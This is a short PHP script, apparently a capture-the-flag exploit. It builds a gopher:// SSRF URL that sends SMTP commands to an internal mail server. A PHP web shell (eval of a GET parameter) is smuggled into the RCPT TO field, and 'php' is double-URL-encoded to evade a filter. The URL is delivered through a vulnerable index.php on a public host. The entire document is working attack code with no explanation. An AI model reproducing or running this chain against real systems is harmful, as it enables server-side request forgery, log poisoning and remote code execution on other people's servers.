<?php
$commands = array(
    'south',
    'MAIL FROM:<i@southseast>',
    'RCPT TO:<script language="php">phpinfo();@eval($_GET[_]);</script>',
    'DATA',
   ' south',
    '.'
);
$payload = implode('%0A', $commands);
$url="gopher://172.18.0.2:25/_".urlencode($payload);
$true_url=str_replace("php","%25%37%30hp",$url);
$true_url=str_replace("\t","",$true_url);
echo $true_url;
echo "http://120.77.215.95/index.%25%37%30hp?x=gopher://172.18.0.2:25/_" . $true_url;
#header('location: http://120.77.215.95/index.php?x=gopher://172.18.0.2:25/_' . $true_url);
?>